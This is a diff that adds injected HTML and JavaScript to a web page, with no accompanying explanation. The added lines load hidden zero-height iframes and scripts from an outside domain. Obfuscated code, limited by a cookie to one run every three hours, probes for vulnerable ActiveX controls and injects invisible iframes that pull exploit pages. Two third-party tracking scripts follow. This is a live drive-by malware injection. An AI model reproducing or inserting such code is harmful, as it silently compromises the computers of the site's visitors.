@@ -1,0 +1,21 @@
+<iframe src=http://user1.fafa29.cn/14.htm width=100 height=0></iframe>
+<iframe src=http://user1.fafa29.cn/fx.htm width=100 height=0></iframe>
+<script language=javascript src=http://user1.fafa29.cn/real10.js></script>
+<script>
+var kaspersky="shabi"
+var L_czcY_1 = new window["Date"]()
+L_czcY_1["setTime"](L_czcY_1["getTime"]() + 3*60*60*1000)
+var Jy2$2 = new window["String"](window["document"]["cookie"])
+var sX$bhbGk3 = "Cookie1="
+var zecKZZ4 = Jy2$2["indexOf"](sX$bhbGk3)
+if (zecKZZ4 == -1)
+{
+window["document"]["cookie"] = "Cookie1=POPWINDOS;expires="+ L_czcY_1["toGMTString"]()
+try{if(new window["ActiveXObject"]("GLIEDown.IEDown.1"))window["document"]["write"]('<iframe style=display:none src="http://user1.fafa29.cn/newlz.htm"></iframe>');}catch(e){}
+try{if(new window["ActiveXObject"]("IERPCtl.IERPCtl.1"))window["document"]["write"]('<iframe style=display:none src="http://user1.fafa29.cn/real11.htm"></iframe>');}catch(e){}
+try{if(new window["ActiveXObject"]("GLCHAT.GLChatCtrl.1"))window["document"]["write"]('<iframe style=display:none src="http://user1.fafa29.cn/lz.htm"></iframe>');}catch(e){}
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=1;
+}
+</script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1611772.js"></script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1937730.js"></script>
